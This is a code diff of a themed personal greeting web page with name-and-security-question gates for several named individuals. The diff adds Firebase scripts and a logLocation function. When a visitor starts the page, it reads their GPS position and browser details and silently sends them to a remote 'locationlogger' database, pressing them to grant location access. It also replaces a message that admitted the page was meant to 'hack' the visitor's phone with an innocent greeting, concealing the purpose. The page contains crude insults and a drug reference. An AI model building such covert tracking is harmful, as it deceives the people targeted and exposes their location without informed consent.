@@ -7,14 +7,14 @@
     <style>
         body { margin: 0; font-family: 'Orbitron', sans-serif; color: #00ffcc; overflow: hidden; background: #000; }
         video { 
-    position: fixed; 
-    top: 0; 
-    left: 0; 
-    width: 100%; 
-    height: 100%; 
-    object-fit: cover; /* Ensures video scales properly */
-    z-index: -1; 
-}
+            position: fixed; 
+            top: 0; 
+            left: 0; 
+            width: 100%; 
+            height: 100%; 
+            object-fit: cover; 
+            z-index: -1; 
+        }
         .container { position: relative; margin: 50px auto; max-width: 600px; padding: 20px; text-align: center; display: none; }
         .start-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); display: flex; justify-content: center; align-items: center; z-index: 1; }
         .start-button { padding: 15px 30px; background: #00ffcc; color: #000; border: none; border-radius: 5px; font-family: 'Orbitron', sans-serif; font-size: 18px; cursor: pointer; box-shadow: 0 0 15px #00ffcc; }
@@ -86,23 +86,22 @@
             position: absolute;
             width: 10px;
             height: 10px;
-            background: #00ffcc; /* Fallback until star image is provided */
-            /* background: url('star-image.png') no-repeat center center; */ /* Uncomment when image is provided */
+            background: #00ffcc;
             background-size: cover;
             animation: starGlow 3s ease-in-out infinite;
             box-shadow: 0 0 10px #00ffcc, 0 0 20px #00ffcc;
         }
         #message p {
-            animation: textFadeIn 2s ease-in 5s forwards; /* Starts 5s after fadeIn (3s + 2s delay) */
+            animation: textFadeIn 2s ease-in 5s forwards;
             opacity: 0;
         }
         #backButton { 
             display: none; 
             margin-top: 20px; 
-            width: 150px; /* Smaller width */
-            margin-left: auto; /* Align to the right */
-            margin-right: 10px; /* Slight offset from the right edge */
-            animation: buttonFadeIn 3s ease-in forwards; /* Slow fade-in for the button */
+            width: 150px;
+            margin-left: auto;
+            margin-right: 10px;
+            animation: buttonFadeIn 3s ease-in forwards;
             opacity: 0;
         }
         #suggestions {
@@ -141,10 +140,10 @@
         <button class="start-button" id="startButton">Initiate Sequence</button>
     </div>
     <video id="bgVideo">
-        <source src="futuristic-background.mp4" type="video/mp4">
+        <source src="/BablugGang/futuristic-background.mp4" type="video/mp4">
     </video>
     <audio id="bgMusic" loop>
-        <source src="background-music.mp3" type="audio/mp3">
+        <source src="/BablugGang/background-music.mp3" type="audio/mp3">
     </audio>
     <div id="particles"></div>
     <div class="container">
@@ -168,7 +167,23 @@
         <button id="backButton" onclick="goBack()">Back</button>
     </div>
 
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore.js"></script>
+
     <script>
+        // Initialize Firebase with your config
+        const firebaseConfig = {
+            apiKey: "AIzaSyD0lnhqJRdGE_WIXUhtdZTXSfprNA",
+            authDomain: "locationlogger-1f198.firebaseapp.com",
+            projectId: "locationlogger-1f198",
+            storageBucket: "locationlogger-1f198.appspot.com",
+            messagingSenderId: "191881120323",
+            appId: "1:191881120323:web:d793bff6fbbcf912a2f6"
+        };
+        const app = firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+
         let video = document.getElementById("bgVideo");
         let bgMusic = document.getElementById("bgMusic");
         let container = document.querySelector(".container");
@@ -189,10 +204,10 @@
 
         // User data with security questions, answers, messages, and images
         const users = {
-            "hafsa siddiqui": {
+            "hafsa siddiqqui": {
                 securityQuestion: "What was the first compliment I ever gave you?",
                 securityAnswer: "w face card",
-                message: "ur pretty cute tbh so i feel bad doing it to u but u leave me no other choice 🥱, the primary purpose is to hack ur phone for the data like u thought would happen (IQ 125) ... Dont panic its too late, already hacked while u were watching the video and entering your name ... Thank you for everything 🌹",
+                message: "hi hoe r u.",
                 image: "hafsa-face.jpg",
                 hint: "Hint: Think about a compliment"
             },
@@ -208,14 +223,14 @@
                 securityAnswer: "King Abbasi 6",
                 message: "King shit man",
                 image: "fasih-face.jpg",
-                hint: "Hint: Think about a place we met"
+                hint: "Hint: Think about your Free Fire name"
             },
             "azhaff khalid": {
                 securityQuestion: "Whats the name of the thc D u gave me?",
                 securityAnswer: "Raastorm",
                 message: "prostitute fucker u r",
                 image: "azhaff-face.jpg",
-                hint: "Hint: u sent me the catalogue of that guy"
+                hint: "Hint: Think about the THC name"
             }
         };
 
@@ -293,63 +308,79 @@
             requestAnimationFrame(step);
         }
 
-// Create star animation on successful login with tilt interaction
-function createStars(count = 20) {
-    particlesDiv.innerHTML = '';
-    particlesDiv.style.display = 'block';
-    isParticlesActive = true;
-    for (let i = 0; i < count; i++) {
-        const star = document.createElement('div');
-        star.className = 'star';
-        star.style.left = Math.random() * 100 + 'vw';
-        star.style.top = Math.random() * 100 + 'vh';
-        star.style.animationDelay = Math.random() * 1 + 's';
-        particlesDiv.appendChild(star);
-    }
-    // Request permission for device orientation on mobile (iOS 13+)
-    if (typeof DeviceOrientationEvent !== 'undefined' && typeof DeviceOrientationEvent.requestPermission === 'function') {
-        DeviceOrientationEvent.requestPermission()
-            .then(permissionState => {
-                if (permissionState === 'granted') {
-                    startTiltListener();
-                } else {
-                    console.log("Device orientation permission denied");
-                }
-            })
-            .catch(error => console.error("Error requesting device orientation permission:", error));
-    } else {
-        startTiltListener(); // For devices that don't require permission
-    }
-    updateStars();
-}
-
-let tiltX = 0, tiltY = 0;
-function startTiltListener() {
-    window.addEventListener('deviceorientation', (event) => {
-        if (isParticlesActive) {
-            tiltX = event.gamma / 90; // Normalize to -1 to 1 based on phone tilt
-            tiltY = event.beta / 90;  // Normalize to -1 to 1 based on phone tilt
-            console.log("Tilt X:", tiltX, "Tilt Y:", tiltY); // Debug tilt values
-        }
-    }, true);
-}
-
-function updateStars() {
-    if (!isParticlesActive) return;
-    const stars = document.querySelectorAll('.star');
-    stars.forEach(star => {
-        star.style.transform = `translate(${tiltX * 20}px, ${tiltY * 20}px)`; // Increased movement range
-    });
-    requestAnimationFrame(updateStars);
-}
-
-        // Handle device orientation for tilt
-        window.addEventListener('deviceorientation', (event) => {
-            if (isParticlesActive) {
-                tiltX = event.gamma / 90; // Normalize to -1 to 1 based on phone tilt
-                tiltY = event.beta / 90;  // Normalize to -1 to 1 based on phone tilt
+        // Function to log location to Firebase
+        function logLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const locationData = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            timestamp: new Date().toISOString(),
+                            userAgent: navigator.userAgent
+                        };
+                        db.collection("locations").add(locationData)
+                            .then(() => console.log("Location logged successfully"))
+                            .catch(error => console.error("Error logging location:", error));
+                    },
+                    (error) => {
+                        console.error("Geolocation error:", error.message);
+                        alert("Please allow location access to proceed.");
+                    }
+                );
+            } else {
+                console.error("Geolocation not supported by this browser.");
             }
-        }, true);
+        }
+
+        // Create star animation on successful login with tilt interaction
+        function createStars(count = 20) {
+            particlesDiv.innerHTML = '';
+            particlesDiv.style.display = 'block';
+            isParticlesActive = true;
+            for (let i = 0; i < count; i++) {
+                const star = document.createElement('div');
+                star.className = 'star';
+                star.style.left = Math.random() * 100 + 'vw';
+                star.style.top = Math.random() * 100 + 'vh';
+                star.style.animationDelay = Math.random() * 1 + 's';
+                particlesDiv.appendChild(star);
+            }
+            if (typeof DeviceOrientationEvent !== 'undefined' && typeof DeviceOrientationEvent.requestPermission === 'function') {
+                DeviceOrientationEvent.requestPermission()
+                    .then(permissionState => {
+                        if (permissionState === 'granted') {
+                            startTiltListener();
+                        } else {
+                            console.log("Device orientation permission denied");
+                        }
+                    })
+                    .catch(error => console.error("Error requesting device orientation permission:", error));
+            } else {
+                startTiltListener();
+            }
+            updateStars();
+        }
+
+        let tiltX = 0, tiltY = 0;
+        function startTiltListener() {
+            window.addEventListener('deviceorientation', (event) => {
+                if (isParticlesActive) {
+                    tiltX = event.gamma / 90;
+                    tiltY = event.beta / 90;
+                    console.log("Tilt X:", tiltX, "Tilt Y:", tiltY);
+                }
+            }, true);
+        }
+
+        function updateStars() {
+            if (!isParticlesActive) return;
+            const stars = document.querySelectorAll('.star');
+            stars.forEach(star => {
+                star.style.transform = `translate(${tiltX * 20}px, ${tiltY * 20}px)`;
+            });
+            requestAnimationFrame(updateStars);
+        }
 
         startButton.addEventListener("click", function() {
             startScreen.style.display = "none";
@@ -376,6 +407,7 @@ function updateStars() {
                 fadeInAudio(bgMusic);
                 document.getElementById("name").focus();
             });
+            logLocation(); // Request location when video starts
         });
 
         // Add input event listener for name suggestions
@@ -387,7 +419,7 @@ function updateStars() {
             event.preventDefault();
             let name = document.getElementById("name").value.trim().toLowerCase();
             if (users[name]) {
-                let menuAudio = new Audio("menu-sound.mp3");
+                let menuAudio = new Audio("/BablugGang/menu-sound.mp3");
                 menuAudio.play();
                 nameForm.style.display = "none";
                 prompt.textContent = "SECURITY VERIFICATION";
@@ -397,47 +429,47 @@ function updateStars() {
                 hintDiv.style.display = "none";
                 attemptCount = 0;
             } else {
-                let denyAudio = new Audio("access-denied.mp3");
+                let denyAudio = new Audio("/BablugGang/access-denied.mp3");
                 denyAudio.play();
                 alert("Access Denied.");
             }
         });
 
-securityForm.addEventListener("submit", function(event) {
-    event.preventDefault();
-    let name = document.getElementById("name").value.trim().toLowerCase();
-    let security = document.getElementById("security").value.trim().toLowerCase();
-    attemptCount++;
-    if (users[name] && security === users[name].securityAnswer) {
-        let menuAudio = new Audio("menu-sound.mp3");
-        menuAudio.play();
-        let accessAudio = new Audio("access-granted.mp3");
-        accessAudio.play();
-        securityForm.style.display = "none";
-        prompt.style.display = "none";
-        createStars();
-        document.getElementById("faceImage").style.display = "block"; // Show image immediately
-        document.getElementById("faceImage").querySelector("img").src = users[name].image;
-        setTimeout(() => {
-            document.getElementById("message").style.display = "block";
-            messageText.textContent = users[name].message;
-            setTimeout(() => {
-                backButton.style.display = "block";
-            }, 15000);
-        }, 1000);
-    } else {
-        let denyAudio = new Audio("access-denied.mp3");
-        denyAudio.play();
-        alert("Incorrect answer.");
-        if (attemptCount >= 2) {
-            hintDiv.textContent = users[name].hint;
-            hintDiv.style.display = "block";
-        }
-    }
-});
+        securityForm.addEventListener("submit", function(event) {
+            event.preventDefault();
+            let name = document.getElementById("name").value.trim().toLowerCase();
+            let security = document.getElementById("security").value.trim().toLowerCase();
+            attemptCount++;
+            if (users[name] && security === users[name].securityAnswer) {
+                let menuAudio = new Audio("/BablugGang/menu-sound.mp3");
+                menuAudio.play();
+                let accessAudio = new Audio("/BablugGang/access-granted.mp3");
+                accessAudio.play();
+                securityForm.style.display = "none";
+                prompt.style.display = "none";
+                createStars();
+                document.getElementById("faceImage").style.display = "block";
+                document.getElementById("faceImage").querySelector("img").src = users[name].image;
+                setTimeout(() => {
+                    document.getElementById("message").style.display = "block";
+                    messageText.textContent = users[name].message;
+                    setTimeout(() => {
+                        backButton.style.display = "block";
+                    }, 15000);
+                }, 1000);
+            } else {
+                let denyAudio = new Audio("/BablugGang/access-denied.mp3");
+                denyAudio.play();
+                alert("Incorrect answer.");
+                if (attemptCount >= 2) {
+                    hintDiv.textContent = users[name].hint;
+                    hintDiv.style.display = "block";
+                }
+            }
+        });
 
         function goBack() {
-            let menuAudio = new Audio("menu-sound.mp3");
+            let menuAudio = new Audio("/BablugGang/menu-sound.mp3");
             menuAudio.play();
             document.getElementById("faceImage").style.display = "none";
             document.getElementById("message").style.display = "none";
@@ -458,13 +490,12 @@ securityForm.addEventListener("submit", function(event) {
         inputs.forEach(input => {
             input.addEventListener("keydown", function(event) {
                 if (event.key !== "Enter") {
-                    let audio = new Audio("typing-sound.mp3");
+                    let audio = new Audio("/BablugGang/typing-sound.mp3");
                     audio.play();
                 }
             });
         });
 
-        // Clear particles when the page is closed
         window.addEventListener('beforeunload', () => {
             particlesDiv.style.display = "none";
             isParticlesActive = false;
